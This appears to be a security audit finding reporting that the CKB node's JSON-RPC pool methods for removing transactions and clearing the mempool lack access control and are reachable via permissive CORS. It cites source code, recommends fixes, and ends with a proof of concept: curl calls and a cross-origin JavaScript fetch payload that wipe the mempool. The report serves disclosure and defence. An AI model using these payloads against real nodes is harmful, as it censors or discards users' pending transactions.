### Title
Missing Access Control on `remove_transaction` and `clear_tx_pool` RPC Methods Allows Unauthorized Mempool Manipulation — (`rpc/src/module/pool.rs`)

---

### Summary

The CKB JSON-RPC `Pool` module exposes `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue` as standard RPC methods with no authentication or authorization check. Any entity that can reach the RPC endpoint — including via cross-origin browser requests enabled by the server's `CorsLayer::permissive()` setting — can silently evict any specific transaction from the mempool or wipe the entire pool. No privileged key, credential, or peer role is required.

---

### Finding Description

**Root cause — no auth layer in the RPC server:**

`rpc/src/server.rs` builds the axum router with only a permissive CORS layer and a timeout layer. There is no authentication middleware, no token check, and no IP allowlist enforcement at the code level:

```rust
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())   // ← allows all origins
    .layer(TimeoutLayer::with_status_code(...))
    .layer(Extension(stream_config));
``` [1](#0-0) 

The `handle_jsonrpc` handler dispatches every incoming call directly to the `MetaIoHandler` with no caller identity check: [2](#0-1) 

**Privileged methods with no access control:**

`remove_transaction` removes a named transaction and all its dependents from the pool: [3](#0-2) 

Its implementation performs no caller check before mutating pool state: [4](#0-3) 

`clear_tx_pool` wipes the entire mempool and resets the block assembler: [5](#0-4) 

`clear_tx_verify_queue` drains the pending verification queue: [6](#0-5) 

The underlying service operations that execute these actions: [7](#0-6) 

All three methods are registered as first-class members of the `Pool` module, which is enabled by default in the standard node configuration: [8](#0-7) 

---

### Impact Explanation

**Targeted transaction censorship via `remove_transaction`:** An attacker who knows a transaction hash (observable from the public mempool via `get_raw_tx_pool`) can silently evict that transaction and all its descendants from the pool. The transaction must be resubmitted by its originator, and the attacker can repeat the eviction indefinitely, permanently preventing inclusion in any block. This is a targeted, zero-cost censorship primitive against any pending transaction.

**Full mempool wipe via `clear_tx_pool`:** A single unauthenticated RPC call destroys all pending transactions and resets the block assembler snapshot. Every user whose transaction was in the pool must resubmit. Miners lose their assembled block template. Repeated calls constitute a sustained denial-of-service against the node's transaction processing pipeline. [9](#0-8) 

---

### Likelihood Explanation

**Direct exposure:** Node operators who bind the RPC to a non-loopback address (explicitly warned against but not prevented by code) expose these methods to any internet host. The warning in the README and config is advisory only. [10](#0-9) 

**CSRF via `CorsLayer::permissive()`:** Even on the default `127.0.0.1:8114` binding, `CorsLayer::permissive()` causes the server to respond to preflight OPTIONS requests with `Access-Control-Allow-Origin: *`. A malicious web page visited by a node operator can issue a cross-origin `fetch` POST to `http://127.0.0.1:8114` calling `clear_tx_pool` or `remove_transaction`. The browser will complete the request because the permissive CORS header explicitly authorizes it. No user interaction beyond visiting the page is required. [11](#0-10) 

The attacker needs only: (1) knowledge of the target transaction hash (public information from `get_raw_tx_pool`), and (2) the ability to serve a web page to the node operator, or direct network access to the RPC port.

---

### Recommendation

1. **Add an authorization layer to the RPC server.** Implement a configurable bearer token or HTTP Basic Auth middleware in `rpc/src/server.rs` that gates all state-mutating methods. The miner client already demonstrates the pattern for Basic Auth credential handling. [12](#0-11) 

2. **Restrict `remove_transaction`, `clear_tx_pool`, and `clear_tx_verify_queue` to a separate privileged module** (analogous to how `IntegrationTest` is gated), disabled by default and requiring explicit opt-in.

3. **Replace `CorsLayer::permissive()` with a restrictive CORS policy** (e.g., same-origin only or an explicit allowlist) to eliminate the CSRF attack surface on localhost deployments. [1](#0-0) 

---

### Proof of Concept

**Targeted censorship (remove a known pending transaction):**
```bash
# Step 1: discover a pending transaction hash
curl -s http://127.0.0.1:8114 -X POST -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false],"id":1}'

# Step 2: evict it — no credentials required
curl -s http://127.0.0.1:8114 -X POST -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"remove_transaction",
       "params":["0xa0ef4eb5f4ceeb08a4c8524d84c5da95dce2f608e0ca2ec8091191b0f330c6e3"],
       "id":2}'
# Returns: {"result": true}  — transaction and all dependents are gone
```

**Full pool wipe:**
```bash
curl -s http://127.0.0.1:8114 -X POST -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":1}'
# Returns: {"result": null}  — entire mempool cleared
```

**CSRF via malicious web page (targets node operator on localhost):**
```html
<script>
fetch("http://127.0.0.1:8114", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({
    jsonrpc: "2.0", method: "clear_tx_pool", params: [], id: 1
  })
});
</script>
```
Because `CorsLayer::permissive()` returns `Access-Control-Allow-Origin: *`, the browser completes the cross-origin POST and the mempool is wiped without any user action beyond page load. [5](#0-4) [4](#0-3)

### Citations

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/server.rs (L218-260)
```rust
async fn handle_jsonrpc<T: Default + Metadata>(
    Extension(io): Extension<Arc<MetaIoHandler<T>>>,
    req_body: Bytes,
) -> Response {
    let make_error_response = |error| {
        Json(jsonrpc_core::Failure {
            jsonrpc: Some(jsonrpc_core::Version::V2),
            id: jsonrpc_core::Id::Null,
            error,
        })
        .into_response()
    };

    let req = match std::str::from_utf8(req_body.as_ref()) {
        Ok(req) => req,
        Err(_) => {
            return make_error_response(jsonrpc_core::Error::parse_error());
        }
    };

    let req = serde_json::from_str::<Request>(req);
    match req {
        Err(_error) => {
            let response = RpcResponse::from(
                Error::new(ErrorCode::ParseError),
                Some(jsonrpc_core::Version::V2),
            );

            serde_json::to_string(&response)
                .map(|json| {
                    (
                        [(axum::http::header::CONTENT_TYPE, "application/json")],
                        json,
                    )
                        .into_response()
                })
                .unwrap_or_else(|_| StatusCode::INTERNAL_SERVER_ERROR.into_response())
        }
        Ok(request) => match request {
            Request::Single(call) => {
                let result = io.handle_call(call, T::default()).await;

                if let Some(response) = result {
```

**File:** rpc/src/module/pool.rs (L254-255)
```rust
    #[rpc(name = "remove_transaction")]
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool>;
```

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** rpc/src/module/pool.rs (L684-692)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/src/module/pool.rs (L694-700)
```rust
    fn clear_tx_verify_queue(&self) -> Result<()> {
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_verify_queue()
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
```

**File:** tx-pool/src/process.rs (L916-930)
```rust
    pub(crate) async fn clear_pool(&mut self, new_snapshot: Arc<Snapshot>) {
        {
            let mut tx_pool = self.tx_pool.write().await;
            tx_pool.clear(Arc::clone(&new_snapshot));
        }
        // reset block_assembler
        if self
            .block_assembler_sender
            .send(BlockAssemblerMessage::Reset(new_snapshot))
            .await
            .is_err()
        {
            error!("block_assembler receiver dropped");
        }
    }
```

**File:** resource/ckb.toml (L189-193)
```text
# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```

**File:** tx-pool/src/pool.rs (L516-522)
```rust
    pub(crate) fn clear(&mut self, snapshot: Arc<Snapshot>) {
        self.pool_map.clear();
        self.snapshot = snapshot;
        self.committed_txs_hash_cache = LruCache::new(COMMITTED_HASH_CACHE_SIZE);
        self.conflicts_cache = LruCache::new(CONFLICTES_CACHE_SIZE);
        self.conflicts_outputs_cache = lru::LruCache::new(CONFLICTES_INPUTS_CACHE_SIZE);
    }
```

**File:** rpc/README.md (L1-6)
```markdown
# CKB JSON-RPC Protocols

The RPC interface shares the version of the node version, which is returned in `local_node_info`. The interface is fully compatible between patch versions, for example, a client for 0.25.0 should work with 0.25.x for any x.

Allowing arbitrary machines to access the JSON-RPC port (using the `rpc.listen_address` configuration option) is **dangerous and strongly discouraged**. Please strictly limit the access to only trusted machines.

```

**File:** miner/src/client.rs (L380-394)
```rust
fn parse_authorization(url: &Uri) -> Option<HeaderValue> {
    let a: Vec<&str> = url.authority()?.as_str().split('@').collect();
    if a.len() >= 2 {
        if a[0].is_empty() {
            return None;
        }
        let mut encoded = "Basic ".to_string();
        base64::prelude::BASE64_STANDARD.encode_string(a[0], &mut encoded);
        let mut header = HeaderValue::from_str(&encoded).unwrap();
        header.set_sensitive(true);
        Some(header)
    } else {
        None
    }
}
```
